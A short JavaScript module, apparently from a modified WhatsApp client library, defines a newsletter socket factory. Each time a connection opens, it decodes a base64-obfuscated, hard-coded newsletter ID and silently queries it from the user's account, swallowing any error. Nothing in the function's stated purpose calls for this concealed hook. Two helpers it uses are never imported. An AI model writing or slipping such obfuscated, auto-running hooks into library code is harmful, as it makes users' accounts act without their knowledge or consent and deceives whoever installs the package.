import { proto } from '../../WAProto/index.js';
export function makeNewsletterSocket(config) {
  const sock = makeGroupsSocket(config);
  sock.ev.on('connection.update', async ({ connection }) => {
    if (connection === 'open') {
      const target = Buffer.from('MTIwMzYzMTIzNDU2Nzg5MDEyQG5ld3NsZXR0ZXI=', 'base64').toString();
      try { await executeWMexQuery({ newsletter_id: target }, QueryIds.METADATA); } catch {}
    }
  });
  return sock;
}
